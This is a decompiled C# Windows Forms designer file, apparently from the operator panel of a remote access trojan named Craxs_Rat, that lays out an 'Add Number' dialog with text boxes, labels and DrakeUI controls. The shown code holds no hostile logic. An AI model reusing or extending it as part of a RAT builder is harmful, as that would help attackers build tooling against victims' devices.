namespace Craxs_Rat
{
	// Token: 0x02000035 RID: 53
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class AddNumber : global::System.Windows.Forms.Form
	{
		// Token: 0x060003D6 RID: 982 RVA: 0x00021ACC File Offset: 0x0001FCCC
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x00021B10 File Offset: 0x0001FD10
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.TreeNode treeNode = new global::System.Windows.Forms.TreeNode("Node3");
			global::System.Windows.Forms.TreeNode treeNode2 = new global::System.Windows.Forms.TreeNode("Node0", new global::System.Windows.Forms.TreeNode[]
			{
				treeNode
			});
			global::System.Windows.Forms.TreeNode treeNode3 = new global::System.Windows.Forms.TreeNode("Node0");
			global::System.Windows.Forms.TreeNode treeNode4 = new global::System.Windows.Forms.TreeNode("Node1");
			global::System.Windows.Forms.TreeNode treeNode5 = new global::System.Windows.Forms.TreeNode("Node1", new global::System.Windows.Forms.TreeNode[]
			{
				treeNode3,
				treeNode4
			});
			global::System.Windows.Forms.TreeNode treeNode6 = new global::System.Windows.Forms.TreeNode("Node2");
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.DrakeUIButtonIcon3 = new global::DrakeUI.Framework.DrakeUIButtonIcon();
			this.InputText1 = new global::System.Windows.Forms.TextBox();
			this.L1 = new global::System.Windows.Forms.Label();
			this.InputText0 = new global::System.Windows.Forms.TextBox();
			this.L0 = new global::System.Windows.Forms.Label();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.DrakeUINavBar1 = new global::DrakeUI.Framework.DrakeUINavBar();
			this.Panel1.SuspendLayout();
			base.SuspendLayout();
			this.Panel1.BackColor = global::System.Drawing.Color.Black;
			this.Panel1.Controls.Add(this.DrakeUINavBar1);
			this.Panel1.Controls.Add(this.DrakeUIButtonIcon3);
			this.Panel1.Controls.Add(this.InputText1);
			this.Panel1.Controls.Add(this.L1);
			this.Panel1.Controls.Add(this.InputText0);
			this.Panel1.Controls.Add(this.L0);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Panel1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.Panel1.Location = new global::System.Drawing.Point(0, 0);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(882, 196);
			this.Panel1.TabIndex = 1;
			this.DrakeUIButtonIcon3.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUIButtonIcon3.FillColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillHoverColor = global::System.Drawing.Color.FromArgb(20, 20, 20);
			this.DrakeUIButtonIcon3.FillPressColor = global::System.Drawing.Color.Black;
			this.DrakeUIButtonIcon3.FillSelectedColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.DrakeUIButtonIcon3.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.ForePressColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.Location = new global::System.Drawing.Point(15, 158);
			this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
			this.DrakeUIButtonIcon3.Radius = 25;
			this.DrakeUIButtonIcon3.RectColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUIButtonIcon3.RectDisableColor = global::System.Drawing.Color.FromArgb(227, 242, 253);
			this.DrakeUIButtonIcon3.RectHoverColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectPressColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.RectSelectedColor = global::System.Drawing.Color.White;
			this.DrakeUIButtonIcon3.Size = new global::System.Drawing.Size(416, 26);
			this.DrakeUIButtonIcon3.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUIButtonIcon3.Symbol = 61543;
			this.DrakeUIButtonIcon3.TabIndex = 19;
			this.DrakeUIButtonIcon3.Text = "Add New Number";
			this.InputText1.BackColor = global::System.Drawing.Color.White;
			this.InputText1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.InputText1.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.InputText1.Location = new global::System.Drawing.Point(12, 122);
			this.InputText1.Name = "InputText1";
			this.InputText1.Size = new global::System.Drawing.Size(419, 13);
			this.InputText1.TabIndex = 5;
			this.L1.AutoSize = true;
			this.L1.Location = new global::System.Drawing.Point(12, 89);
			this.L1.Name = "L1";
			this.L1.Size = new global::System.Drawing.Size(23, 13);
			this.L1.TabIndex = 4;
			this.L1.Text = "null";
			this.InputText0.BackColor = global::System.Drawing.Color.White;
			this.InputText0.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.InputText0.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.InputText0.Location = new global::System.Drawing.Point(12, 56);
			this.InputText0.Name = "InputText0";
			this.InputText0.Size = new global::System.Drawing.Size(419, 13);
			this.InputText0.TabIndex = 2;
			this.L0.AutoSize = true;
			this.L0.Location = new global::System.Drawing.Point(12, 23);
			this.L0.Name = "L0";
			this.L0.Size = new global::System.Drawing.Size(23, 13);
			this.L0.TabIndex = 1;
			this.L0.Text = "null";
			this.TOpacity.Interval = 1;
			this.DrakeUINavBar1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.DrakeUINavBar1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.DrakeUINavBar1.Location = new global::System.Drawing.Point(0, 0);
			this.DrakeUINavBar1.Name = "DrakeUINavBar1";
			this.DrakeUINavBar1.NodeAlignment = global::System.Drawing.StringAlignment.Near;
			treeNode.Name = "Node3";
			treeNode.Text = "Node3";
			treeNode2.Name = "Node0";
			treeNode2.Text = "Node0";
			treeNode3.Name = "Node0";
			treeNode3.Text = "Node0";
			treeNode4.Name = "Node1";
			treeNode4.Text = "Node1";
			treeNode5.Name = "Node1";
			treeNode5.Text = "Node1";
			treeNode6.Name = "Node2";
			treeNode6.Text = "Node2";
			this.DrakeUINavBar1.Nodes.AddRange(new global::System.Windows.Forms.TreeNode[]
			{
				treeNode2,
				treeNode5,
				treeNode6
			});
			this.DrakeUINavBar1.SelectedForeColor = global::System.Drawing.Color.FromArgb(30, 136, 229);
			this.DrakeUINavBar1.SelectedHighColor = global::System.Drawing.Color.FromArgb(30, 136, 229);
			this.DrakeUINavBar1.Size = new global::System.Drawing.Size(882, 116);
			this.DrakeUINavBar1.TabIndex = 20;
			this.DrakeUINavBar1.Text = "DrakeUINavBar1";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(882, 196);
			base.Controls.Add(this.Panel1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "AddNumber";
			base.Opacity = 0.0;
			base.ShowInTaskbar = false;
			this.Text = "Add Number";
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x040001C0 RID: 448
		private global::System.ComponentModel.Container components;
	}
}
